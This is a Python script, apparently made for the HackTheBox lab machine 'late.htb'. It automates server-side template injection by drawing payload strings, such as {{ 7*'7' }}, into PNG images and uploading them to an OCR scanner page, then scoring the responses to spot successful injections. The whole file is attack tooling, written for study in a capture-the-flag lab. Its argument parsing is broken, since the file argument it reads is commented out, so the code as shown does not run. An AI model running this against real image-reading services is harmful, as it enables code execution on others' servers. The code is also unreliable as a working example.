from PIL import Image, ImageDraw, ImageFont
import os
import requests
import argparse

# This was script 1/3 - First script was intended to automate the process of creating a png of some text, uploading it to a site, and reading
# the results.

# url of the ImageReader page we are attacking
url = "http://images.late.htb/scanner"
#url = "http://127.0.0.1:5000/scanner"
# prepend ssti text with this string of chars i.e:  aaa {{ 7*'7' }}
prepend="aaa"
# prefix of the img files to save
pre="img_"
# ext of the img files
ext=".png"
# Font file to use for the image  - consolai.ttf @ 12pt gave me 80% but still not very good.. only tested 10-28
#fontfile="DejaVuSerifCondensed-Bold.ttf" # size 24 worked well - 98% on the test but only 73% on an SSTI =[
fontfile="LiberationMono-Regular.ttf"
# THX Romain!!

# 96% Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 26
# 97% Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 25
# 97% Trying font file Lato-BolBdItalic.ttf size: 28
# 97% Trying font file DejaVuSerifCondensed.ttf size: 16
# 97% Trying font file DejaVuSansCondensed-Bold.ttf size: 24
# 98% Trying font file DejaVuSerifCondensed.ttf size: 23
# 98% Trying font file DejaVuSerifCondensed-Bold.ttf size: 24

# Font size to use for the image
fontsize=32
# Save images? 0=no 1=yes
imgsave=1
# image number to start with (if you are saving the images)
num=0
# minimum number of chars to consider a 'hit', i.e successfully pulled classes
hitminimum=120

# global vars
hits=[]
hitcounter=0

def send(fname,num,txt):
    global hits
    global hitcounter
    chnum=0
    likeness=0
    #print("[.] sending file "+fname+" to "+url+" ..",)
    #print("from: "+txt+" len: "+str(len(txt)))
    file = {'file': open(fname, 'rb')}
    r=requests.post(url, files=file)
    code=str(r.status_code)
    resp=r.text.replace("\r\n","").replace("<p>","").replace("</p>","").replace("&gt;",">").replace("&lt;","<").replace("&#39;","'")
    # check response for 'class', if so lets pick out classes
    # TODO : ^^
    # check response for accuracy
    for ch in resp:
        if chnum<len(txt):
            # resp might be longer, and usually is..
            #print("compare: "+txt[chnum]+" to "+ch)
            if ch == txt[chnum]:
                # problem = one space early on and likeness is screwed, could be inaccurate, but most are towards the end..
                likeness+=1
        chnum+=1
    numscore=round((likeness/len(txt))*100)
    score=str(numscore)
    print(code+" "+score+"%\t"+resp)
    if (len(r.text)>hitminimum):
        hits.append("[!] HIT! "+str(num)+" : "+txt+" = Likely hit, "+str(len(r.text))+" chars")
        print(hits[hitcounter])
        hitcounter+=1
    return(numscore)

print("\n\n")
print("imguploader.py - crypticsilence 2022-05-07")

parser = argparse.ArgumentParser("simple_example")
#parser.add_argument("tfilename", help="File of SSTI strings to try injecting, one per line", type=str)
parser.add_argument('-v', '--version', action='version',
                    version='%(prog) 0.1c', help="Show program version number and exit.")
parser.add_argument("-hh", help="Extended help/information", required=False)
args = parser.parse_args()

if (args.hh):
    print("  (made for htb box late.htb)")
    print("  creates a .png file with text using PIL ImageDraw.Draw(), and uploads to a site via POST")
    print("  you should test with an alphabet.txt first, and make sure your font is returning the correct reply text!")
    print("  i.e something like : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\\{}|;':\",./<>?")
    print("  You can view images with 'eom img_0.png' if Eye of Mate image viewer, if installed")
    print("  Score is a percentage that will show the results of the current font w/ tesseract..")
print("\n\n")
print("Err Score String")

if 1==1:
    if 1==1:
        #print("Using font file "+fontfile+" size: "+str(fontsize))
        fnt = ImageFont.truetype(fontfile,fontsize)
        with open(args.tfilename) as tfile:
            for txt in tfile:
                txt=prepend+txt
                if len(txt)>1:
                    # create new image for each ssti attempt- which must be a single line!
                    print("Tried:\t"+txt.strip("\n"))
                    image = Image.new(mode = "RGB", size = (1600,80), color = "black")
                    draw = ImageDraw.Draw(image)
                    draw.text((10,10), txt, font=fnt, fill=(255,255,0))
                    filename = pre+str(num)+ext
                    image.save(filename)
                    score=send(filename,num,txt)
                    num+=1
        tfile.close()
    fontsize+=1

if not imgsave:
    os.system("rm -f "+pre+"*.png")
else:
    print("[o] Saved "+str(num)+" png images")

print(hits)
